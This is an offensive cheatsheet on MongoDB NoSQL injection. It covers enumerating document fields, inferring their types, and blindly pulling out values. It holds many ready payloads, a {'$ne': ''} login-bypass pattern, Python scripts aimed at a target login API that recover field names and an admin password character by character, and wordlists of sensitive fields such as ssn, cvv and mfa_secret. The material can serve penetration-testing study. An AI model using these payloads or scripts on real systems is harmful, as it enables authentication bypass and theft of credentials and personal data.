# NoSQL Field Discovery Workflow Cheatsheet

## Overview

Field discovery is a critical phase in NoSQL injection exploitation. Since NoSQL databases are schema-less, field names must be discovered through enumeration, context analysis, and blind extraction techniques.

---

## 1. Understanding `this` in MongoDB

In MongoDB's `$where` operator, `this` refers to the **current document** being evaluated.

```javascript
this.username      // Access 'username' field in current document
this.password      // Access 'password' field in current document
this["field"]      // Alternative bracket notation
this.nested.field  // Access nested fields
```

**Key JavaScript methods for enumeration:**

| Method | Purpose |
|--------|---------|
| `Object.keys(this)` | Returns array of all field names |
| `Object.keys(this).length` | Count of fields |
| `Object.keys(this)[0]` | First field name |
| `this.hasOwnProperty('field')` | Check if field exists |
| `typeof this.field` | Get field type |
| `this.field.length` | Length of field value |

---

## 2. Reconnaissance Phase

### 2.1 Context Clues

Analyze the application to guess likely field names:

| Application Context | Likely Fields |
|--------------------|---------------|
| **Login/Auth** | `username`, `user`, `email`, `password`, `passwd`, `pass`, `pwd`, `hash` |
| **User Profile** | `name`, `firstName`, `lastName`, `email`, `phone`, `address`, `avatar`, `bio` |
| **Access Control** | `role`, `roles`, `isAdmin`, `is_admin`, `admin`, `permissions`, `level`, `type` |
| **Sessions/Tokens** | `token`, `sessionId`, `apiKey`, `api_key`, `secret`, `refreshToken` |
| **Password Reset** | `resetToken`, `reset_token`, `resetExpiry`, `otp`, `verificationCode` |
| **E-commerce** | `price`, `quantity`, `stock`, `category`, `released`, `available`, `discount` |
| **Financial** | `balance`, `credit`, `amount`, `ssn`, `cardNumber`, `cvv`, `accountNumber` |
| **Timestamps** | `created`, `updated`, `createdAt`, `updatedAt`, `timestamp`, `date`, `modified` |
| **Status** | `status`, `active`, `enabled`, `verified`, `approved`, `deleted`, `banned` |
| **IDs** | `_id`, `id`, `Id`, `userId`, `user_id`, `uuid` |

### 2.2 Information Gathering Sources

| Source | What to Look For |
|--------|------------------|
| **HTML/JS source** | Form field names, AJAX requests, variable names |
| **API responses** | JSON keys in responses |
| **Error messages** | Field names in stack traces |
| **URL parameters** | Parameter names often match field names |
| **Cookies** | Cookie names may reflect field names |
| **Documentation** | API docs, swagger files |
| **Mobile app** | Decompiled code, API calls |
| **GitHub/GitLab** | Source code, schemas, models |

### 2.3 Common MongoDB Default Fields

Every MongoDB document has:

```
_id         // Unique ObjectId (always present)
__v         // Version key (Mongoose)
createdAt   // If timestamps enabled
updatedAt   // If timestamps enabled
```

---

## 3. Field Existence Confirmation

### 3.1 Using `$exists` Operator

**Basic syntax:**
```json
{"fieldName": {"$exists": true}}
```

**In authentication context:**
```json
{"username": "admin", "password": {"$ne": ""}, "targetField": {"$exists": true}}
```

**Testing multiple fields:**
```json
{"$and": [
  {"username": {"$exists": true}},
  {"password": {"$exists": true}},
  {"secret": {"$exists": true}}
]}
```

### 3.2 Using `$where` Operator

**Check single field:**
```json
{"$where": "this.secretField !== undefined"}
```

**Alternative checks:**
```json
{"$where": "this.hasOwnProperty('secret')"}
{"$where": "'secret' in this"}
{"$where": "typeof this.secret !== 'undefined'"}
```

### 3.3 Response Analysis

| Response | Interpretation |
|----------|----------------|
| Normal/Success | Field likely exists |
| Error/Empty | Field doesn't exist |
| Different content length | Field existence affects query |
| Time difference | Possible time-based confirmation |

---

## 4. Field Count Enumeration

### 4.1 Determine Number of Fields

**Binary search approach:**
```json
{"$where": "Object.keys(this).length > 10"}   // Too high? 
{"$where": "Object.keys(this).length > 5"}    // Narrow down
{"$where": "Object.keys(this).length > 7"}    // Continue...
{"$where": "Object.keys(this).length == 6"}   // Found! 6 fields
```

**Quick payloads:**
```json
{"$where": "Object.keys(this).length == 1"}
{"$where": "Object.keys(this).length == 2"}
{"$where": "Object.keys(this).length == 3"}
{"$where": "Object.keys(this).length == 4"}
{"$where": "Object.keys(this).length == 5"}
// Continue until true response
```

### 4.2 Syntax Injection Variant

```javascript
' && Object.keys(this).length == 5 && '
' || Object.keys(this).length > 3 || '
```

---

## 5. Field Name Extraction

### 5.1 Character-by-Character Extraction

**Extract first field name:**
```json
// First character of first field
{"$where": "Object.keys(this)[0][0] == 'a'"}
{"$where": "Object.keys(this)[0][0] == 'b'"}
// ... continue through alphabet
{"$where": "Object.keys(this)[0][0] == 'u'"}   // ✅ Found 'u'

// Second character
{"$where": "Object.keys(this)[0][1] == 'a'"}
{"$where": "Object.keys(this)[0][1] == 's'"}   // ✅ Found 's'

// Continue until complete: "username"
```

**Extract nth field name:**
```json
{"$where": "Object.keys(this)[0][0] == 'x'"}   // 1st field
{"$where": "Object.keys(this)[1][0] == 'x'"}   // 2nd field
{"$where": "Object.keys(this)[2][0] == 'x'"}   // 3rd field
{"$where": "Object.keys(this)[3][0] == 'x'"}   // 4th field
```

### 5.2 Get Field Name Length

```json
{"$where": "Object.keys(this)[0].length == 5"}    // First field is 5 chars?
{"$where": "Object.keys(this)[0].length == 8"}    // First field is 8 chars?
```

### 5.3 Regex-Based Field Name Matching

```json
{"$where": "/^user/.test(Object.keys(this)[0])"}      // Field starts with 'user'
{"$where": "/admin/.test(Object.keys(this)[2])"}      // Field contains 'admin'
{"$where": "/^pass/.test(Object.keys(this)[1])"}      // Field starts with 'pass'
```

### 5.4 Direct Field Name Guessing

```json
{"$where": "Object.keys(this)[0] == 'username'"}
{"$where": "Object.keys(this)[1] == 'password'"}
{"$where": "Object.keys(this)[2] == 'email'"}
{"$where": "Object.keys(this).includes('isAdmin')"}
```

---

## 6. Field Type Discovery

### 6.1 Using `$type` Operator

```json
{"fieldName": {"$type": "string"}}
{"fieldName": {"$type": "int"}}
{"fieldName": {"$type": "bool"}}
{"fieldName": {"$type": "array"}}
{"fieldName": {"$type": "object"}}
{"fieldName": {"$type": "objectId"}}
```

### 6.2 MongoDB Type Reference

| Type | Number | Alias |
|------|--------|-------|
| Double | 1 | "double" |
| String | 2 | "string" |
| Object | 3 | "object" |
| Array | 4 | "array" |
| Binary | 5 | "binData" |
| ObjectId | 7 | "objectId" |
| Boolean | 8 | "bool" |
| Date | 9 | "date" |
| Null | 10 | "null" |
| Regex | 11 | "regex" |
| Int32 | 16 | "int" |
| Timestamp | 17 | "timestamp" |
| Int64 | 18 | "long" |
| Decimal128 | 19 | "decimal" |

### 6.3 Using `$where` for Type Checking

```json
{"$where": "typeof this.field == 'string'"}
{"$where": "typeof this.field == 'number'"}
{"$where": "typeof this.field == 'boolean'"}
{"$where": "typeof this.field == 'object'"}
{"$where": "Array.isArray(this.field)"}
```

---

## 7. Field Value Extraction

### 7.1 Value Length Discovery

```json
{"$where": "this.password.length == 8"}
{"$where": "this.password.length > 5"}
{"$where": "this.password.length < 20"}
```

**Binary search for length:**
```json
{"$where": "this.password.length > 10"}   // No
{"$where": "this.password.length > 5"}    // Yes
{"$where": "this.password.length > 7"}    // Yes
{"$where": "this.password.length > 8"}    // No
{"$where": "this.password.length == 8"}   // Yes! Length is 8
```

### 7.2 Character-by-Character Value Extraction

**Using array notation:**
```json
{"$where": "this.password[0] == 'a'"}
{"$where": "this.password[1] == 'b'"}
{"$where": "this.password[2] == 'c'"}
```

**Using charAt:**
```json
{"$where": "this.password.charAt(0) == 'a'"}
{"$where": "this.password.charAt(1) == 'b'"}
```

**Using substring:**
```json
{"$where": "this.password.substring(0,1) == 'a'"}
{"$where": "this.password.substring(0,2) == 'ab'"}
```

### 7.3 Using `$regex` for Value Extraction

```json
{"password": {"$regex": "^a"}}        // Starts with 'a'
{"password": {"$regex": "^ab"}}       // Starts with 'ab'
{"password": {"$regex": "^abc"}}      // Starts with 'abc'
```

**Case-insensitive:**
```json
{"password": {"$regex": "^a", "$options": "i"}}
```

---

## 8. Nested Field Discovery

### 8.1 Discovering Nested Objects

```json
{"$where": "typeof this.user == 'object'"}
{"$where": "this.user !== null && typeof this.user == 'object'"}
```

### 8.2 Enumerating Nested Fields

```json
{"$where": "Object.keys(this.user).length > 0"}
{"$where": "Object.keys(this.user)[0] == 'email'"}
{"$where": "this.user.hasOwnProperty('role')"}
```

### 8.3 Accessing Nested Values

```json
{"$where": "this.user.role == 'admin'"}
{"$where": "this.profile.settings.theme == 'dark'"}
{"user.role": {"$exists": true}}
{"user.role": {"$eq": "admin"}}
```

---

## 9. Array Field Discovery

### 9.1 Detecting Array Fields

```json
{"$where": "Array.isArray(this.roles)"}
{"roles": {"$type": "array"}}
```

### 9.2 Array Length

```json
{"$where": "this.roles.length == 2"}
{"$where": "this.roles.length > 0"}
{"roles": {"$size": 2}}
```

### 9.3 Array Element Access

```json
{"$where": "this.roles[0] == 'admin'"}
{"$where": "this.roles.includes('admin')"}
{"roles": {"$elemMatch": {"$eq": "admin"}}}
{"roles.0": "admin"}
```

---

## 10. Complete Discovery Workflow

### Phase 1: Reconnaissance

```
1. Analyze application context (login, profile, e-commerce, etc.)
2. Review HTML/JS source for field hints
3. Check API responses for JSON structure
4. Note any error messages revealing field names
5. Create wordlist of likely field names
```

### Phase 2: Confirm Known Fields

```json
// Test obvious fields first
{"username": {"$exists": true}}
{"password": {"$exists": true}}
{"email": {"$exists": true}}
{"_id": {"$exists": true}}
```

### Phase 3: Count Total Fields

```json
{"$where": "Object.keys(this).length == 1"}
{"$where": "Object.keys(this).length == 2"}
// ... find exact count
```

### Phase 4: Discover Unknown Fields

```json
// For each field index (0 to count-1):
// Extract name character by character
{"$where": "Object.keys(this)[N][0] == 'a'"}
// Continue through charset for each position
```

### Phase 5: Determine Field Types

```json
{"discoveredField": {"$type": "string"}}
{"discoveredField": {"$type": "int"}}
// ... test each type
```

### Phase 6: Extract Sensitive Values

```json
// Get value length
{"$where": "this.secretField.length == N"}

// Extract character by character
{"$where": "this.secretField[0] == 'x'"}
```

---

## 11. Automation Scripts

### 11.1 Python: Field Existence Check

```python
import requests
import json

url = "https://target.com/api/login"
fields_to_test = [
    "username", "password", "email", "role", "isAdmin",
    "token", "secret", "apiKey", "resetToken", "otp",
    "ssn", "cardNumber", "balance", "permissions"
]

def test_field(field):
    payload = {
        "username": {"$ne": ""},
        "password": {"$ne": ""},
        field: {"$exists": True}
    }
    try:
        r = requests.post(url, json=payload, timeout=10)
        return r.status_code == 200 and "success" in r.text.lower()
    except:
        return False

print("[*] Testing field existence...")
for field in fields_to_test:
    if test_field(field):
        print(f"[+] Field exists: {field}")
    else:
        print(f"[-] Field not found: {field}")
```

### 11.2 Python: Field Count Discovery

```python
import requests

url = "https://target.com/api/login"

def check_field_count(count):
    payload = {
        "$where": f"Object.keys(this).length == {count}"
    }
    data = {"username": payload, "password": {"$ne": ""}}
    r = requests.post(url, json=data, timeout=10)
    return "success" in r.text.lower()

print("[*] Discovering field count...")
for i in range(1, 20):
    if check_field_count(i):
        print(f"[+] Document has {i} fields")
        break
```

### 11.3 Python: Field Name Extraction

```python
import requests
import string

url = "https://target.com/api/login"
charset = string.ascii_lowercase + string.digits + "_"

def extract_field_name(field_index):
    extracted = ""
    
    # First get length
    length = 0
    for l in range(1, 30):
        payload = {"$where": f"Object.keys(this)[{field_index}].length == {l}"}
        data = {"username": payload, "password": {"$ne": ""}}
        r = requests.post(url, json=data, timeout=10)
        if "success" in r.text.lower():
            length = l
            break
    
    if length == 0:
        return None
    
    print(f"[*] Field {field_index} length: {length}")
    
    # Extract characters
    for pos in range(length):
        for char in charset:
            payload = {"$where": f"Object.keys(this)[{field_index}][{pos}] == '{char}'"}
            data = {"username": payload, "password": {"$ne": ""}}
            r = requests.post(url, json=data, timeout=10)
            if "success" in r.text.lower():
                extracted += char
                print(f"[*] Progress: {extracted}")
                break
    
    return extracted

# Extract first 5 field names
for i in range(5):
    field_name = extract_field_name(i)
    if field_name:
        print(f"[+] Field {i}: {field_name}")
```

### 11.4 Python: Value Extraction

```python
import requests
import string

url = "https://target.com/api/login"
charset = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:',.<>?/`~"

def extract_value(field_name, username="admin"):
    extracted = ""
    
    # Get length first
    length = 0
    for l in range(1, 50):
        payload = {"$where": f"this.{field_name}.length == {l}"}
        data = {"username": username, "password": payload}
        r = requests.post(url, json=data, timeout=10)
        if "success" in r.text.lower():
            length = l
            break
    
    print(f"[*] {field_name} length: {length}")
    
    # Extract value
    for pos in range(length):
        for char in charset:
            # Escape special chars for JavaScript
            escaped_char = char.replace("'", "\\'").replace("\\", "\\\\")
            payload = {"$where": f"this.{field_name}[{pos}] == '{escaped_char}'"}
            data = {"username": username, "password": payload}
            r = requests.post(url, json=data, timeout=10)
            if "success" in r.text.lower():
                extracted += char
                print(f"[*] {field_name}: {extracted}")
                break
    
    return extracted

# Extract password for admin user
password = extract_value("password", "admin")
print(f"[+] Extracted password: {password}")
```

---

## 12. Wordlists

### 12.1 Common Field Names

```
_id
id
username
user
email
password
passwd
pass
pwd
hash
salt
name
firstName
lastName
first_name
last_name
fullName
full_name
role
roles
isAdmin
is_admin
admin
permissions
level
type
token
apiKey
api_key
secret
secretKey
accessToken
access_token
refreshToken
refresh_token
sessionId
session_id
resetToken
reset_token
resetExpiry
otp
verificationCode
verification_code
phone
mobile
address
avatar
bio
description
status
active
enabled
verified
approved
deleted
banned
created
updated
createdAt
updatedAt
created_at
updated_at
timestamp
date
modified
lastLogin
last_login
loginAttempts
login_attempts
balance
credit
amount
price
quantity
stock
category
ssn
cardNumber
card_number
cvv
accountNumber
account_number
```

### 12.2 Sensitive Field Names

```
password
passwd
pass
pwd
secret
secretKey
private_key
privateKey
apiKey
api_key
token
accessToken
refreshToken
ssn
social_security
cardNumber
credit_card
cvv
pin
accountNumber
routing_number
balance
salary
income
tax_id
dob
date_of_birth
mother_maiden
security_answer
otp
2fa_secret
mfa_secret
recovery_codes
```

---

## 13. Quick Reference

### Field Existence

| Method | Payload |
|--------|---------|
| `$exists` | `{"field": {"$exists": true}}` |
| `$where` undefined check | `{"$where": "this.field !== undefined"}` |
| `$where` hasOwnProperty | `{"$where": "this.hasOwnProperty('field')"}` |
| `$where` in operator | `{"$where": "'field' in this"}` |

### Field Count

| Method | Payload |
|--------|---------|
| Exact count | `{"$where": "Object.keys(this).length == N"}` |
| Greater than | `{"$where": "Object.keys(this).length > N"}` |

### Field Name Extraction

| Method | Payload |
|--------|---------|
| Full name (index i) | `{"$where": "Object.keys(this)[i] == 'name'"}` |
| Character (index i, pos j) | `{"$where": "Object.keys(this)[i][j] == 'x'"}` |
| Name length | `{"$where": "Object.keys(this)[i].length == N"}` |
| Contains string | `{"$where": "Object.keys(this)[i].includes('str')"}` |

### Field Type

| Type | Payload |
|------|---------|
| String | `{"field": {"$type": "string"}}` |
| Number | `{"field": {"$type": "int"}}` |
| Boolean | `{"field": {"$type": "bool"}}` |
| Array | `{"field": {"$type": "array"}}` |
| Object | `{"field": {"$type": "object"}}` |

### Value Extraction

| Method | Payload |
|--------|---------|
| Value length | `{"$where": "this.field.length == N"}` |
| Character at position | `{"$where": "this.field[N] == 'x'"}` |
| Regex prefix | `{"field": {"$regex": "^abc"}}` |
| Starts with | `{"$where": "this.field.startsWith('x')"}` |

---

## ⚠️ Important Notes

- `$where` is often disabled in production environments
- `$exists` is more reliable and commonly available
- Blind extraction is time-consuming — automate when possible
- Some fields may be indexed differently — try variations
- Nested fields require dot notation or bracket access
- Always test in authorized environments only
- Rate limiting may affect automated extraction
- Consider time-based techniques if boolean responses are unclear
